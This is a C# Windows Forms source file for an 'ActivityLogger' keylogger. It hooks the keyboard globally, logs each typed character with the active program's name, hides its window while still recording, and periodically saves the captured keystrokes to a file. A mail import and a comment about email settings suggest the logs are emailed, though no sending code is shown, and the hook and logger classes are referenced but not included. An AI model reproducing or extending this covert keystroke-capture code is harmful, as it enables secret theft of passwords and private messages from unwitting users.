using ActivityLogger.Loggers.Concrete;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

namespace ActivityLogger
{
    public partial class FrmMain : Form
    {
        private readonly Frmoptions option;
        private UserActivityHook hooker;
        private bool loggerOn;
        private HtmlLogger logger;

        public FrmMain()
        {
            InitializeComponent();
            option = new Frmoptions();
        }

        private void ButtonStartClick(object sender, EventArgs e)
        {
            if (!hooker.IsActive)
            {
                hooker.Start();

                if (loggerOn)
                    timer_logsaver.Enabled = true;
            }
        }

        private void ButtonStopClick(object sender, EventArgs e)
        {
            if (hooker.IsActive)
            {
                hooker.Stop();
                timer_logsaver.Enabled = false;
            }
        }

        private void MainFormLoad(object sender, EventArgs e)
        {
            hooker = new UserActivityHook();
            hooker.KeyDown += HookerKeyDown;
            hooker.KeyPress += HookerKeyPress;
            hooker.KeyUp += HookerKeyUp;
            hooker.OnMouseActivity += HookerMouseActivity;
            hooker.Stop();

            logger = new HtmlLogger();
        }

        public void HookerMouseActivity(object sender, MouseEventArgs e){}

        public void HookerKeyDown(object sender, KeyEventArgs e){}

        public void HookerKeyUp(object sender, KeyEventArgs e) { }

        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            Logger(FilterKeyChar(e.KeyChar));
        }

        private string FilterKeyChar(char key)
        {
            //Grab all digits/letters/punctuations/symbols/punctuations
            if(Char.IsLetterOrDigit(key) || Char.IsPunctuation(key) || Char.IsSymbol(key) || Char.IsPunctuation(key))
            {
                return key.ToString();
            }

            var charString = key.ToString();
            switch (charString)
            {
                case " ": return " ";
                case "\t": return " ";
                case "\r": return "\n";
            }

            return string.Empty;
        }

        private void Logger(string txt)
        {
            txt_Log.AppendText(txt);
            txt_Log.SelectionStart = txt_Log.Text.Length;

            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                logger.Log(p.ProcessName, txt);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }

        private void Timer1Tick(object sender, EventArgs e)
        {
            if (txt_CurrentWindowstitle.Text == Text)
                txt_CurrentWindowstitle.Text = "Current Window Title";
        }

        private void BtnHideClick(object sender, EventArgs e)
        {
            Hide();
            hooker.Start();
        }

        private void BtnExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void TimerLogsaverTick(object sender, EventArgs e)
        {
            logger.Save(logger.LogFilePath);
        }

        private void mnuItem_Settings_Click(object sender, EventArgs e)
        {
            // we don't want log our email password!
            if (hooker.IsActive)
                hooker.Stop();

            if (option.ShowDialog() == DialogResult.OK)
            {
                if (option.chk_autosaver.Checked)
                {
                    if (option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
                        logger.LogFilePath = option.txt_filelocation.Text;

                    timer_logsaver.Interval = (int) (option.numeric_savetimer.Value*60000);
                    timer_logsaver.Enabled = true;
                    loggerOn = true;
                }
                else
                {
                    timer_logsaver.Enabled = false;
                    loggerOn = false;
                }
            }
        }

        private void notifyIcon1_Click(object sender, EventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }

        private void frmMain_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                this.Hide();
            }
        }

        private void MnuItemHideClick(object sender, EventArgs e)
        {
            Hide();
            hooker.Start();
        }

        private void MnuItemExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void MnuItemSaveClick(object sender, EventArgs e)
        {
            var savef = new SaveFileDialog
                            {
                                Title = "Save ...",
                                Filter = "CSActivityLogger log files (*.html)|*.html",
                                FileName = "Logfile.html"
                            };
            if (savef.ShowDialog() == DialogResult.OK)
            {
                logger.Save(savef.FileName);
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }

        //End Menu Events

        #region Nested type: Params

        public class Params
        {
            public string Logstr;

            public Params(string logstr)
            {
                Logstr = logstr;
            }
        }

        #endregion


    }
}